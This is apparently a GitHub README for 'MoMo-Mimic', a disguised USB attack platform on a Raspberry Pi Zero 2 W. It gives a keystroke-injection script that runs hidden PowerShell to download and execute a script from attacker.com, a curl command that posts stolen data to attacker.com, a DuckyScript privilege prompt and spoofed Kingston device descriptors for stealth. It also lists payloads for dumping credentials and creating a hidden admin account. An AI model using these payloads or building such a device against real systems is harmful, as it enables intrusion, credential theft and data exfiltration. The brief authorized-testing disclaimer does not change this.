# 🎭 MoMo-Mimic

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Pi%20Zero%202%20W-c51a4a?style=for-the-badge&logo=raspberry-pi" alt="Platform">
  <img src="https://img.shields.io/badge/Framework-P4wnP1-purple?style=for-the-badge" alt="P4wnP1">
  <img src="https://img.shields.io/badge/Type-HID%20Injection-red?style=for-the-badge" alt="HID">
  <img src="https://img.shields.io/badge/Version-1.0.0-blue?style=for-the-badge" alt="Version">
</p>

<h3 align="center">Polymorphic USB Attack Platform</h3>

<p align="center">
  <strong>Looks like a USB drive. Acts like a weapon.</strong><br>
  HID Injection • Network Hijack • Data Exfil • Covert Channel
</p>

---

## 🎯 What is MoMo-Mimic?

MoMo-Mimic is a **polymorphic USB attack platform** based on Raspberry Pi Zero 2 W. It looks like an ordinary USB flash drive but can dynamically transform into:

- ⌨️ **Keyboard** - Type 10,000 keystrokes/second
- 🌐 **Ethernet Adapter** - Hijack network traffic
- 💾 **Mass Storage** - Exfiltrate data
- 📡 **WiFi Bridge** - Bypass corporate firewalls

```
┌─────────────────────────────────────────────────────────────────┐
│                      MoMo-Mimic                                  │
│                                                                  │
│    Looks like:              Acts like:                          │
│    ┌─────────┐              ┌─────────────────────────────┐     │
│    │ ████████│              │ ⌨️  Keyboard (HID)          │     │
│    │ USB     │      →       │ 🌐 Ethernet (RNDIS/ECM)    │     │
│    │ Drive   │              │ 💾 Mass Storage            │     │
│    └─────────┘              │ 📡 WiFi Covert Channel     │     │
│                             └─────────────────────────────┘     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## ✨ Features

### 🎭 Polymorphic USB Emulation
| Mode | Description | Use Case |
|------|-------------|----------|
| **HID Keyboard** | Emulates keyboard, types at 10K keys/sec | Payload injection, reverse shells |
| **HID Mouse** | Emulates mouse for GUI automation | Click-based attacks |
| **Ethernet** | RNDIS/ECM network adapter | MitM, traffic capture |
| **Mass Storage** | Appears as USB drive | Data exfiltration |
| **Composite** | Multiple devices simultaneously | Combined attacks |

### ⚔️ Attack Capabilities
| Attack | Description |
|--------|-------------|
| **Keystroke Injection** | DuckyScript compatible payloads |
| **Reverse Shell** | PowerShell/Bash backdoors in seconds |
| **Credential Theft** | Mimikatz, browser password dump |
| **Network Hijack** | Redirect traffic through device |
| **WiFi Exfil** | Bypass firewall via Pi's WiFi |
| **Responder** | Capture NTLM hashes |

### 🛡️ Stealth Features
- USB flash drive appearance
- Custom 3D printed enclosure
- No external cables
- Instant deployment
- Remote management via WiFi

---

## 🛠️ Hardware

### Bill of Materials

| Component | Description | Cost |
|-----------|-------------|------|
| **Raspberry Pi Zero 2 W** | Quad-core, WiFi & BT | ~$15 |
| **USB Stem Kit** | Converts to USB-A dongle | ~$10 |
| **MicroSD Card** | 16-32GB SanDisk Extreme | ~$10 |
| **Custom Enclosure** | 3D printed USB drive case | ~$5 |
| **Total** | | **~$40** |

### Form Factor

```
┌──────────────────────────────────────┐
│          MoMo-Mimic Device           │
│                                      │
│  ┌────────────────────────────────┐  │
│  │  Raspberry Pi Zero 2 W        │  │
│  │  ┌──────┐  ┌──────┐  ┌─────┐  │  │
│  │  │ CPU  │  │ WiFi │  │ BT  │  │  │
│  │  └──────┘  └──────┘  └─────┘  │  │
│  │                                │  │
│  │  ┌──────────────────────────┐  │  │
│  │  │      USB Stem Kit        │  │  │
│  │  │      (USB-A Male)        │◄─┼──┼── To Target PC
│  │  └──────────────────────────┘  │  │
│  └────────────────────────────────┘  │
│                                      │
│  Size: ~55mm x 25mm x 10mm          │
│  (Standard USB drive dimensions)     │
│                                      │
└──────────────────────────────────────┘
```

---

## 💾 Software Stack

### Core Framework: P4wnP1 A.L.O.A.

| Component | Technology |
|-----------|------------|
| **OS** | Kali Linux Pi / Raspbian Lite |
| **Framework** | P4wnP1 A.L.O.A. |
| **Scripting** | JavaScript + DuckyScript |
| **Management** | Web UI (WiFi hotspot) |
| **USB Gadget** | Linux USB Gadget API |

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                       P4wnP1 A.L.O.A.                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │   Web    │  │  HID     │  │ Network  │  │  WiFi    │        │
│  │   UI     │  │  Script  │  │  Gadget  │  │  AP      │        │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘        │
│       │             │             │             │               │
│       └─────────────┴──────┬──────┴─────────────┘               │
│                            │                                    │
│                     ┌──────▼──────┐                             │
│                     │   P4wnP1    │                             │
│                     │   Service   │                             │
│                     └──────┬──────┘                             │
│                            │                                    │
│  ┌─────────────────────────┼─────────────────────────┐         │
│  │                  KERNEL SPACE                      │         │
│  │                         │                          │         │
│  │  ┌──────────┐    ┌──────▼──────┐    ┌──────────┐  │         │
│  │  │ USB      │    │  ConfigFS   │    │ WiFi     │  │         │
│  │  │ Gadget   │◄───│  (gadgetfs) │───►│ hostapd  │  │         │
│  │  └──────────┘    └─────────────┘    └──────────┘  │         │
│  └───────────────────────────────────────────────────┘         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## ⚔️ Attack Vectors

### 1. HID Keyboard Attack

**Speed:** 10,000+ keystrokes/second

```javascript
// Example: Reverse Shell in 5 seconds
layout("us");
typingSpeed(0,0);

press("GUI-r");
delay(500);
type("powershell -w hidden -ep bypass");
press("ENTER");
delay(1000);
type("IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')");
press("ENTER");
```

**DuckyScript Compatible:**
```
REM Open PowerShell as Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING whoami
ENTER
```

### 2. USB Ethernet Hijack

```
Target PC                    MoMo-Mimic                  Internet
    │                            │                           │
    │  USB Connect               │                           │
    │ ──────────────────────────►│                           │
    │                            │                           │
    │  "New Network Adapter"     │                           │
    │ ◄──────────────────────────│                           │
    │                            │                           │
    │  All Traffic via USB       │   WiFi to Internet       │
    │ ══════════════════════════►│══════════════════════════►│
    │                            │                           │
    │                  ┌─────────┴─────────┐                 │
    │                  │ • Packet Capture  │                 │
    │                  │ • DNS Spoofing    │                 │
    │                  │ • MITM Attacks    │                 │
    │                  │ • Responder       │                 │
    │                  └───────────────────┘                 │
```

### 3. Data Exfiltration

```
┌─────────────────────────────────────────────────────────────────┐
│                    EXFIL WORKFLOW                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. HID Script runs              2. Data collected              │
│  ┌──────────────────┐            ┌──────────────────┐          │
│  │ type("copy...")  │ ────────►  │ Hidden partition │          │
│  │ type("curl...")  │            │ on MicroSD       │          │
│  └──────────────────┘            └─────────┬────────┘          │
│                                            │                    │
│  3. WiFi exfil (optional)                  │                    │
│  ┌──────────────────────────────────────────▼──────────────┐   │
│  │                                                          │   │
│  │  curl -X POST http://attacker.com/data -d @loot.zip     │   │
│  │                                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4. WiFi Covert Channel

```
Corporate Network                              Internet
      │                                            │
      │  ┌─────────────┐     ┌─────────────┐      │
      │  │  Target PC  │────►│ MoMo-Mimic  │──────┼────► Attacker C2
      │  │             │ USB │  (WiFi AP)  │ WiFi │
      │  └─────────────┘     └─────────────┘      │
      │                                            │
      │  Firewall blocks outbound                 │
      │  But USB-to-WiFi bypasses it!             │
      │                                            │
```

---

## 🚀 Quick Start

### 1. Flash Image

```bash
# Download P4wnP1 A.L.O.A. image
wget https://github.com/RoganDawes/P4wnP1_aloa/releases/latest/download/kali-linux-p4wnp1-aloa.img.xz

# Flash to MicroSD
xzcat kali-linux-p4wnp1-aloa.img.xz | sudo dd of=/dev/sdX bs=4M status=progress
sync
```

### 2. Assemble Hardware

```
1. Solder/attach USB Stem to Pi Zero 2 W test pads
2. Insert MicroSD card
3. Place in custom enclosure
4. Done - looks like USB drive!
```

### 3. First Boot

```bash
# Plug into any USB power source
# Wait 60 seconds for boot

# Connect to WiFi hotspot:
#   SSID: P4wnP1
#   Password: MaMe82

# Open browser:
#   http://172.24.0.1:8000
```

### 4. Deploy Payload

```
1. Go to "HIDScript" tab
2. Select or write payload
3. Click "Run"
4. Plug into target PC
5. Watch the magic happen
```

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [README.md](README.md) | This file |
| [docs/PAYLOADS.md](docs/PAYLOADS.md) | Attack payload library |
| [docs/HARDWARE.md](docs/HARDWARE.md) | Hardware assembly guide |
| [docs/OPSEC.md](docs/OPSEC.md) | Operational security |

---

## 🔧 Configuration

### USB Gadget Modes

```yaml
# /etc/P4wnP1/config.yml

usb:
  # Composite device (multiple functions)
  functions:
    - hid_keyboard    # Keyboard emulation
    - hid_mouse       # Mouse emulation  
    - rndis           # Windows network
    - ecm             # Linux/Mac network
    - mass_storage    # USB drive
    
  # Device descriptors (stealth)
  vendor_id: "0x0951"      # Kingston
  product_id: "0x1666"     # DataTraveler
  manufacturer: "Kingston"
  product: "DataTraveler 3.0"
  serial: "001CC0DE1337"
```

### WiFi Access Point

```yaml
wifi:
  mode: ap
  ssid: "MoMo-Mimic"
  password: "SecurePass123!"
  channel: 6
  hidden: false
  
  # Stealth mode
  # hidden: true
  # ssid: ""
```

---

## 🎯 Use Cases

### Red Team Scenarios

| Scenario | Attack | Time |
|----------|--------|------|
| **Reception Drop** | Leave on desk, HID injects backdoor | 5 sec |
| **IT Support** | "Check this USB", capture creds | 10 sec |
| **Meeting Room** | Plug into TV, network pivot | Ongoing |
| **Printer USB** | Data exfil via hidden storage | Hours |

### Payload Examples

| Payload | Description |
|---------|-------------|
| `reverse_shell.js` | PowerShell reverse shell |
| `wifi_password.js` | Extract saved WiFi passwords |
| `browser_creds.js` | Dump browser credentials |
| `mimikatz.js` | Memory credential extraction |
| `backdoor_user.js` | Create hidden admin account |

---

## ⚠️ Legal Disclaimer

**MoMo-Mimic is designed for authorized penetration testing and security research only.**

- Only use on systems you own or have explicit written permission to test
- Unauthorized use is illegal in most jurisdictions
- The developers are not responsible for misuse

---

## 🤝 Credits

- [P4wnP1 A.L.O.A.](https://github.com/RoganDawes/P4wnP1_aloa) by MaMe82
- [Hak5 Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)
- DuckyScript language

---

<p align="center">
  <strong>Part of the 🔥 MoMo Platform</strong><br>
  <sub>Offensive Security Toolkit for Red Teams</sub>
</p>

